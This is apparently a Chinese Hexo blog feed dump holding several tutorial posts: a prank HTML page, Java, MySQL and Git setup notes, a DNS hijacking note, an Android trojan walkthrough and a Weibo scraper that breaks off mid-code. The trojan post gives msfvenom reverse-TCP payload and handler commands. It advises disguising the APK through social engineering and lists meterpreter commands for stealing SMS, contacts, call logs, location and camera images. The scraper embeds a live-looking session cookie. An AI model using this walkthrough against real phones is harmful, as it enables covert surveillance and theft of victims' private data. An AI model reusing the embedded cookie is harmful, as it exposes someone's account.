class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=0.86, maximum-scale=3.0, minimum-scale=0.86&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>哈哈哈大煞笔<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;#228b22&quot;</span>&gt;</span>别 看 啦 你 没 对 象<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line">body &#123;</span><br><span class="line"><span class="css"><span class="selector-tag">background</span>: <span class="selector-tag">url</span>(<span class="selector-tag">img</span>/123<span class="selector-class">.jpg</span>) <span class="selector-tag">no-repeat</span>;</span></span><br><span class="line">background-size: cover;</span><br><span class="line">margin: 0px;</span><br><span class="line">overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;init()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span>=<span class="string">&quot;autoplay&quot;</span>  <span class="attr">loop</span>=<span class="string">&quot;loop&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;img/shenjingbing.mp3&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/ThreeCanvas.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/Snow.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> deviceWidth = <span class="built_in">parseInt</span>(<span class="built_in">window</span>.screen.width);  <span class="comment">//获取当前设备的屏幕宽度</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> deviceScale = deviceWidth / <span class="number">640</span>;  <span class="comment">//得到当前设备屏幕与640之间的比例，之后我们就可以将网页宽度固定为640px</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ua = navigator.userAgent;</span></span><br><span class="line"><span class="javascript"><span class="comment">//获取当前设备类型（安卓或苹果）</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (<span class="regexp">/Android (\d+\.\d+)/</span>.test(ua)) &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> version = <span class="built_in">parseFloat</span>(<span class="built_in">RegExp</span>.$1);</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (version &gt; <span class="number">2.3</span>) &#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;meta name=&quot;viewport&quot; content=&quot;width=640,initial-scale=&#x27;</span> + deviceScale + <span class="string">&#x27;, minimum-scale = &#x27;</span> + deviceScale + <span class="string">&#x27;, maximum-scale = &#x27;</span> + deviceScale + <span class="string">&#x27;, target-densitydpi=device-dpi&quot;&gt;&#x27;</span>);</span></span><br><span class="line"><span class="javascript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">document.write(&#x27;<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=640,initial-scale=0.75,maximum-scale=0.75,minimum-scale=0.75,target-densitydpi=device-dpi&quot;</span> /&gt;</span>&#x27;);</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">document.write(&#x27;<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=640, user-scalable=no&quot;</span>&gt;</span>&#x27;);</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> SCREEN_WIDTH = <span class="built_in">window</span>.innerWidth;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> SCREEN_HEIGHT = <span class="built_in">window</span>.innerHeight;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> container;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> particle;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> camera;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> scene;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> renderer;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> mouseX = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> mouseY = <span class="number">0</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> windowHalfX = <span class="built_in">window</span>.innerWidth / <span class="number">2</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> windowHalfY = <span class="built_in">window</span>.innerHeight / <span class="number">2</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> particles = [];</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> particleImage = <span class="keyword">new</span> Image();</span></span><br><span class="line"><span class="javascript">particleImage.src = <span class="string">&#x27;img/ParticleSmoke.png&#x27;</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">container = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(container);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">camera = <span class="keyword">new</span> THREE.PerspectiveCamera( <span class="number">75</span>, SCREEN_WIDTH / SCREEN_HEIGHT, <span class="number">1</span>, <span class="number">10000</span> );</span></span><br><span class="line">camera.position.z = 1000;</span><br><span class="line"></span><br><span class="line"><span class="javascript">scene = <span class="keyword">new</span> THREE.Scene();</span></span><br><span class="line">scene.add(camera);</span><br><span class="line"></span><br><span class="line"><span class="javascript">renderer = <span class="keyword">new</span> THREE.CanvasRenderer();</span></span><br><span class="line">renderer.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> material = <span class="keyword">new</span> THREE.ParticleBasicMaterial( &#123; <span class="attr">map</span>: <span class="keyword">new</span> THREE.Texture(particleImage) &#125; );</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i++) &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">particle = <span class="keyword">new</span> Particle3D( material);</span></span><br><span class="line"><span class="javascript">particle.position.x = <span class="built_in">Math</span>.random() * <span class="number">2000</span> - <span class="number">1000</span>;</span></span><br><span class="line"><span class="javascript">particle.position.y = <span class="built_in">Math</span>.random() * <span class="number">2000</span> - <span class="number">1000</span>;</span></span><br><span class="line"><span class="javascript">particle.position.z = <span class="built_in">Math</span>.random() * <span class="number">2000</span> - <span class="number">1000</span>;</span></span><br><span class="line">particle.scale.x = particle.scale.y =  1;</span><br><span class="line">scene.add( particle );</span><br><span class="line"></span><br><span class="line">particles.push(particle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">container.appendChild( renderer.domElement );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.addEventListener( <span class="string">&#x27;mousemove&#x27;</span>, onDocumentMouseMove, <span class="literal">false</span> );</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.addEventListener( <span class="string">&#x27;touchstart&#x27;</span>, onDocumentTouchStart, <span class="literal">false</span> );</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.addEventListener( <span class="string">&#x27;touchmove&#x27;</span>, onDocumentTouchMove, <span class="literal">false</span> );</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">setInterval</span>( loop, <span class="number">1000</span> / <span class="number">60</span> );</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onDocumentMouseMove</span>(<span class="params"> event </span>) </span>&#123;</span></span><br><span class="line"></span><br><span class="line">mouseX = event.clientX - windowHalfX;</span><br><span class="line">mouseY = event.clientY - windowHalfY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onDocumentTouchStart</span>(<span class="params"> event </span>) </span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> ( event.touches.length == <span class="number">1</span> ) &#123;</span></span><br><span class="line"></span><br><span class="line">event.preventDefault();</span><br><span class="line"></span><br><span class="line">mouseX = event.touches[ 0 ].pageX - windowHalfX;</span><br><span class="line">mouseY = event.touches[ 0 ].pageY - windowHalfY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onDocumentTouchMove</span>(<span class="params"> event </span>) </span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> ( event.touches.length == <span class="number">1</span> ) &#123;</span></span><br><span class="line"></span><br><span class="line">event.preventDefault();</span><br><span class="line"></span><br><span class="line">mouseX = event.touches[ 0 ].pageX - windowHalfX;</span><br><span class="line">mouseY = event.touches[ 0 ].pageY - windowHalfY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">loop</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i&lt;particles.length; i++)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> particle = particles[i];</span></span><br><span class="line">particle.updatePhysics();</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">with</span>(particle.position)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(y&lt;-<span class="number">1000</span>) y+=<span class="number">2000</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(x&gt;<span class="number">1000</span>) x-=<span class="number">2000</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">else</span> <span class="keyword">if</span>(x&lt;-<span class="number">1000</span>) x+=<span class="number">2000</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(z&gt;<span class="number">1000</span>) z-=<span class="number">2000</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">else</span> <span class="keyword">if</span>(z&lt;-<span class="number">1000</span>) z+=<span class="number">2000</span>;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">camera.position.x += ( mouseX - camera.position.x ) * 0.05;</span><br><span class="line">camera.position.y += ( - mouseY - camera.position.y ) * 0.05;</span><br><span class="line">camera.lookAt(scene.position);</span><br><span class="line"></span><br><span class="line">renderer.render( scene, camera );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu下的JAVA环境</title>
      <link href="2021/02/12/Ubuntu%E4%B8%8B%E7%9A%84JAVA%E7%8E%AF%E5%A2%83/"/>
      <url>2021/02/12/Ubuntu%E4%B8%8B%E7%9A%84JAVA%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h2 id="环境是Ubuntu20-4，zsh">环境是Ubuntu20.4，zsh</h2><p>首先配置zsh，因为待会要写环境变量，毕竟./bashrc这个东西太搞了。</p><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zsh</span><br></pre></td></tr></table></figure><p>把默认shell改成zsh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s &#x2F;bin&#x2F;zsh</span><br></pre></td></tr></table></figure><p>检测下配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>把最后一行的<code>/bin/bash改成/bin/zsh</code>，这个应该是每台电脑的登录用户名+计算机名组成的。</p><p>安装oh-my-zsh    ——&gt;<a href="https://ohmyz.sh/">官网链接</a></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20212126.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.github.com&#x2F;robbyrussell&#x2F;oh-my-zsh&#x2F;master&#x2F;tools&#x2F;install.sh)&quot;</span><br></pre></td></tr></table></figure><p>最后重启就ok了</p><h2 id="JAVA和JDK">JAVA和JDK</h2><p>我这里下载的jdk8 官网找到download <a href="https://www.oracle.com/java/technologies/">https://www.oracle.com/java/technologies/</a></p><p>这是最新的</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/464.png" alt=""></p><p>选择Linux-x64版本的，download这里需要你有账号，注册很快</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/fsg.png" alt=""></p><p>下载完就解压，进入当前目录 pwd看下路径（稳一手）</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/75.png" alt=""></p><p>然后回到根<code>cd ~</code></p><p>修改.<code>/zshrc</code> 添加环境变量，找到这个位置</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/vsds.png" alt=""></p><p>添加如下</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/gsg.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME&#x3D;自己的路径</span><br><span class="line">export PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin</span><br><span class="line">export CLASSPATH&#x3D;.:$JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jar</span><br></pre></td></tr></table></figure><p>ojer kei</p><p>写个demo测试下</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/asfaf.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库MySQL的配置</title>
      <link href="2021/02/11/%E6%95%B0%E6%8D%AE%E5%BA%93MySQL%E7%9A%84%E9%85%8D%E7%BD%AE/"/>
      <url>2021/02/11/%E6%95%B0%E6%8D%AE%E5%BA%93MySQL%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1>免安装版的Mysql</h1><p>MySQL关是一种关系数据库管理系统，所使用的 SQL 语言是用于访问<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728">数据库</a>的最常用的</p><p>标准化语言，其特点为体积小、速度快、总体拥有成本低，尤其是<a href="https://baike.baidu.com/item/%E5%BC%80%E6%94%BE%E6%BA%90%E7%A0%81/7176422">开放源码</a>这一特点，在 Web</p><p>应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据</p><p>库管理系统)应用软件之一。</p><h2 id="一、下载安装包："><strong>一、下载安装包：</strong></h2><p>进入官网后，点击&quot;Dowload&quot;，然后页面往下拉</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210211094956.png" alt=""></p><p>接下来跳转到这个页面，在这里，下载社区版的Server</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210211095132.png" alt="img"></p><p>下载免安装版(windows以外的其他系统除外)</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210211095309.png" alt=""></p><h2 id="二、Mysql的配置"><strong>二、Mysql的配置</strong></h2><p>以管理员身份打开命令行下转到mysql的bin目录下：</p><p>1. 安装mysql的服务：</p><p>​     <code>mysqld --install</code></p><ol start="2"><li><p>初始化mysql，在这里，初始化会产生一个随机密码，记住这个密码，后面会用到</p><p><code>mysqld --initialize --console</code></p></li></ol><p></p><ol start="3"><li>开启mysql的服务</li></ol><p>​<code>net start mysql</code></p><ol start="4"><li><p>登录root账户</p><p><code>mysql -u root -p</code> 密码是之前保存的随机密码</p></li></ol><h2 id="root账户密码修改">root账户密码修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin -uroot -p123456 password 123</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Git切换用户push报错403问题</title>
      <link href="2021/02/10/%E8%A7%A3%E5%86%B3Git%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7push%E6%8A%A5%E9%94%99403%E9%97%AE%E9%A2%98/"/>
      <url>2021/02/10/%E8%A7%A3%E5%86%B3Git%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7push%E6%8A%A5%E9%94%99403%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>向自己的Git仓库提交代码时，报错：push的时候报错 403：xxxxxx. 意思为当前存在两个账户，我自己的账户没有提交代码的权限。</p><p>使用全局信息配置好像不大行</p><p><code>git config --global usr.name &quot;&quot;</code></p><p><code>git config --global usr.emial</code></p><p>但本地还是没有权限</p><p>找到了解决办法，在Windows设置 —&gt; 控制面板里找到用户凭据，管理Windows凭据里修改git的信息。</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210210194814.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决git push仓库报错</title>
      <link href="2021/02/10/%E8%A7%A3%E5%86%B3git%20push%20%E4%BB%93%E5%BA%93%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/"/>
      <url>2021/02/10/%E8%A7%A3%E5%86%B3git%20push%20%E4%BB%93%E5%BA%93%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="错误原因">错误原因</h3><p>远程库与本地库不一致造成的，那么我们把远程库同步到本地库就可以了。</p><h3 id="解决方法">解决方法</h3><p>1.重新pull<br><code>git pull --rebase origin master</code><br>2.重新push<br><code>git push origin master</code></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网DNS劫持</title>
      <link href="2020/12/22/%E5%86%85%E7%BD%91DNS%E5%8A%AB%E6%8C%81/"/>
      <url>2020/12/22/%E5%86%85%E7%BD%91DNS%E5%8A%AB%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<p>DNS（域名系统）的作用是把网络地址（域名，以一个字符串的形式）对应到真实的计算机能够识别的网络地址（IP地址），以便计算机能够进一步通信，传递网址和内容等。由于域名劫持往往只能在特定的被劫持的网络范围内进行，所以在此范围外的域名服务器(DNS)能够返回正常的IP地址，高级用户可以在网络设置把DNS指向这些正常的域名服务器以实现对网址的正常访问。所以域名劫持通常相伴的措施——封锁正常DNS的IP。</p><p>呃我这里并没有做过多的钓鱼操作，实际上用arp欺骗在公共场合搭配钓鱼页面可以实现盗号之类的，但是违法请勿操作，关于操作懒得写了，在哔哩哔哩上传了视频，有的给不过审，但这个操作无关紧要所以过了，具体操作可以看下面视频</p><iframe src="//player.bilibili.com/player.html?aid=885593044&bvid=BV15K4y1L7fH&cid=264004228&page=1" scrolling="no" border="0" width=600 height=500 frameborder="no" framespacing="0" allowfullscreen="true" > </iframe>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf木马渗透手机拍照</title>
      <link href="2020/12/21/msf%E6%9C%A8%E9%A9%AC%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%BA%E6%8B%8D%E7%85%A7/"/>
      <url>2020/12/21/msf%E6%9C%A8%E9%A9%AC%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%BA%E6%8B%8D%E7%85%A7/</url>
      
        <content type="html"><![CDATA[<p>​环境  kali 2020.4</p><p>​  Android手机一部</p><p>只是简单的一次测试，木马并没有加壳和免杀和提权操作</p><p>原理： msfvenom是msfpayload,msfencode的结合体,它的优点是单一,命令行,和效率.利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线</p><p>kali下 sudo -i开启root</p><p>打开msf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p andorid&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;IP LPORT&#x3D;5555 R&gt; &#x2F;hoan&#x2F;home&#x2F;Desktop&#x2F;a.akp</span><br></pre></td></tr></table></figure><p>1.msf&gt; use exploit/multi/handler //加载模块</p><p>2.msf&gt; set payload android/meterpreter/reverse_tcp //选择Payload</p><p>#修改Ip和端口</p><p>3.<code>msf&gt; set LHOST 192.168.43.18 //</code>Ip设置为本机ip</p><p>4.<code>msf&gt; set LPORT 5555</code> //端口设置为配置的本地端口</p><p>5.<code>msf&gt; exploit </code>//开始监听，等待木马响应</p><p>可以键入<code>sysinfo</code> 查看手机信息了。</p><p>这里 的apk包建议伪装成熟知的安装包，利用社会工程学方式植入被攻击者手机</p><p>关于攻击方式</p><p>Stdapi: Webcam Commands</p><p>===================================</p><p>webcam_list 列出网络摄像头</p><p>record_mic [ˈrekərd]/记录/ 从默认麦克风录制音频为X秒</p><p>webcam_chat 开始视频聊天</p><p>webcam_snap 从指定的摄像头获取快照</p><p>webcam_stream -i 1 从指定的网络摄像头播放视频流[选择后摄像头]</p><p>Android Commands</p><p>=================</p><p>activity_start 从URI字符串启动Android活动</p><p>check_root 检查设备是否有根</p><p>dump_calllog 获取调用日志</p><p>dump_contacts 获取联系人列表</p><p>dump_sms 获取短信</p><p>geolocate 利用地理定位获取当前LAT</p><p>wlan_geolocate 利用WLAN信息获取当前LAT</p><p>hide_app_icon 从发射器隐藏应用程序图标</p><p>interval_collect 管理区间收集能力</p><p>send_sms 从目标会话发送短消息</p><p>set_audio_mode</p><p>sqlite_query 从存储库查询SQLite数据库</p><p>wakelock 启用/禁用Wakelock</p><p><img src="D:%5Cblog%5Csource_posts%5Cimg%5C133.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python编写微博爬虫</title>
      <link href="2020/08/13/Python%E7%BC%96%E5%86%99%E5%BE%AE%E5%8D%9A%E7%88%AC%E8%99%AB/"/>
      <url>2020/08/13/Python%E7%BC%96%E5%86%99%E5%BE%AE%E5%8D%9A%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<p>闲来无事写个爬虫玩玩，关于微博的正则还挺好些的</p><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">​```python</span><br><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line"><span class="keyword">import</span>  json</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span>    urllib.request <span class="keyword">import</span> urlretrieve</span><br><span class="line"><span class="comment">#构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sk</span>():</span></span><br><span class="line">    <span class="comment">#请求头</span></span><br><span class="line">    header=&#123;</span><br><span class="line">        <span class="string">&#x27;user-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;cookie&#x27;</span>:<span class="string">&#x27;SINAGLOBAL=7539808571181.766.1594904938878; login_sid_t=d5cd1bd9f275813e62c15325ed13f107; cross_origin_proto=SSL; _s_tentry=www.google.com.hk; Apache=6567219473432.515.1594948744234; ULV=1594948744243:2:2:2:6567219473432.515.1594948744234:1594904938884; UOR=www.google.com.hk,www.weibo.com,www.google.com.hk; SUB=_2A25yFI6zDeRhGeBG4lAS-CvEzDWIHXVRY-d7rDV8PUNbmtANLWvCkW9NQfFYtiChpvR5j8HL-b3qtR4iP5VWlahr; SUBP=0033WrSXqPxfM725Ws9jqgMF55529P9D9WFgGcLsqLAolPfV0X13gOKE5JpX5KzhUgL.FoqR1Kz01h-RS0.2dJLoIc2LxKqL1hnL1K2LxKML1KBLBKyydCH8SFHFxFHWeFH8SE-4SFHW1s8E9CH8SFHF1FHW1sL0i--Ri-isiKL8i--NiKL2iKn7i--Xi-iFiK.ci--fi-2fi-z4i--fi-88iKn0; SUHB=079jhOx3o5wTZ7; ALF=1626485347; SSOLoginState=1594949347; wvr=6; WBStorage=42212210b087ca50|undefined; webim_unReadCount=%7B%22time%22%3A1594950237072%2C%22dm_pub_total%22%3A0%2C%22chat_group_client%22%3A0%2C%22chat_group_notice%22%3A0%2C%22allcountNum%22%3A0%2C%22msgbox%22%3A0%7D&#x27;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#循环</span></span><br><span class="line">    <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):<span class="comment">#页数</span></span><br><span class="line">        url =<span class="string">&#x27;https://photo.weibo.com/photos/get_all?uid=6179279336&amp;album_id=4088933483139641&amp;count=30&amp;page=&#x27;</span>+<span class="built_in">str</span>(z)+<span class="string">&#x27;&amp;type=3&amp;__rnd=1594950245139&#x27;</span></span><br><span class="line">        s=requests.get(url,headers=header)</span><br><span class="line">        t=s.json()[<span class="string">&#x27;data&#x27;</span>][<span 